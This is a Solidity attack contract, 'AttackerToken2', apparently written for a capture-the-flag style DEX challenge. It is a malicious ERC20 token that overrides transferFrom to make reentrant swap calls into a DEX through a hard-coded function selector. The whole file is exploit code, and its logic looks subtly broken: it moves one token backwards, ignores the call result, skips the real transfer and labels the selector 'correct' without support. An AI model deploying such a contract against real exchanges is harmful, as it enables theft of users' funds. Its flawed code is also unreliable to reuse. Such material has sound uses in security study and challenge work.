pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

contract AttackerToken2 is ERC20 {
    address private _dex;
    address private _token1;

    constructor(string memory name, string memory symbol, uint256 initialSupply, address dexAddress, address token1Address) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexAddress;
        _token1 = token1Address;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        // Reentrancy via recursive swap calls in transferFrom
        IERC20(_token1).transferFrom(recipient, sender, 1);
        (bool success,) = _dex.call(abi.encodeWithSelector(0xdba1e3a3, address(this), _token1, amount)); // Correct selector for swap
        return true;
    }
}
